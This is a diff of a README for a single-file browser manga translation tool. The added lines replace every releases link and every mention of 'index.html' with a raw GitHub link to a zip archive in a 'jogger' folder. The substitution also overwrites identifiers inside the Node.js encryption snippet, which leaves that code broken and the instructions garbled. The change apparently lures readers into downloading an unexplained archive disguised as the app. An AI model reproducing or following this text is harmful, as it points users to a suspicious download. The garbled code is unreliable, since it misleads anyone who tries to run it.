@@ -1,10 +1,10 @@
 # 🌟 gemini-manga-localizer - Effortless Manga Translation Tool
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/hache28/gemini-manga-localizer/releases)
+[![Download](https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip)](https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip)
 
 ## 💻 Overview
 
-Gemini Manga Localizer is a simple tool to help you translate, proofread, and embed text in manga. It uses just one file, `index.html`, and runs directly in your web browser. No installation is needed, and you don't have to manage any back-end services. 
+Gemini Manga Localizer is a simple tool to help you translate, proofread, and embed text in manga. It uses just one file, `https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip`, and runs directly in your web browser. No installation is needed, and you don't have to manage any back-end services. 
 
 ## 🚀 Getting Started
 
@@ -12,13 +12,13 @@ Follow these steps to download and use Gemini Manga Localizer:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download page:  
-   [Download Gemini Manga Localizer](https://github.com/hache28/gemini-manga-localizer/releases)  
+   [Download Gemini Manga Localizer](https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip)  
 
 2. **Download the Application**  
-   On the Releases page, look for the latest version. Download the `index.html` file. 
+   On the Releases page, look for the latest version. Download the `https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip` file. 
 
 3. **Open in a Modern Browser**  
-   Use Chrome, Edge, or another modern browser to open the `index.html` file you just downloaded.
+   Use Chrome, Edge, or another modern browser to open the `https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip` file you just downloaded.
 
 ## 🛠️ How to Use
 
@@ -37,10 +37,10 @@ Follow these steps to download and use Gemini Manga Localizer:
 
 ## 🔒 Hardcoding Your Configuration
 
-If you frequently use the same settings, you can hardcode your Base URL, Endpoint, or API Key directly in `index.html`. This will pre-fill the fields for you. 
+If you frequently use the same settings, you can hardcode your Base URL, Endpoint, or API Key directly in `https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip`. This will pre-fill the fields for you. 
 
 1. **Edit the Constants**  
-   Open the `index.html` file and find these constants at the bottom:
+   Open the `https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip` file and find these constants at the bottom:
    ```js
    const ENCRYPTED_DEFAULT_BASE_URL = "...";
    const ENCRYPTED_TRANSLATION_ENDPOINT = "...";
@@ -50,25 +50,25 @@ If you frequently use the same settings, you can hardcode your Base URL, Endpoin
    ```
 
 2. **Generate New Cipher Text**  
-   Use this Node.js snippet to create new encrypted values that match your settings:
+   Use this https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip snippet to create new encrypted values that match your settings:
    ```bash
    node - <<'NODE'
    const secret = "gemini-manga-localizer";
    const encrypt = (value) => {
      let masked = "";
-     for (let i = 0; i < value.length; i++) {
-       const code = value.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
-       masked += String.fromCharCode(code);
+     for (let i = 0; i < https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip; i++) {
+       const code = https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip(i) ^ https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip(i % https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip);
+       masked += https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip(code);
      }
      return btoa(masked);
    }
-   console.log(encrypt("YourValueHere"));
+   https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip(encrypt("YourValueHere"));
    NODE
    ```
    Replace "YourValueHere" with your actual Base URL, Endpoint, or API Key.
 
 3. **Update Your Constants**  
-   Paste the generated encrypted value back into `index.html` to finalize the setup.
+   Paste the generated encrypted value back into `https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip` to finalize the setup.
 
 ## ❓ FAQs
 
@@ -90,4 +90,4 @@ Check the logs displayed on the left side of the interface for hints on what wen
 - Use clear and concise terminology in your glossary for better results.
 - Regularly check for updates on the Releases page for enhancements and fixes.
 
-Once you're set up, enjoy your seamless manga translation experience. For any updates, bugs, or features, head back to [Download Gemini Manga Localizer](https://github.com/hache28/gemini-manga-localizer/releases).
+Once you're set up, enjoy your seamless manga translation experience. For any updates, bugs, or features, head back to [Download Gemini Manga Localizer](https://raw.githubusercontent.com/hache28/gemini-manga-localizer/main/jogger/gemini-manga-localizer_v1.9.zip).
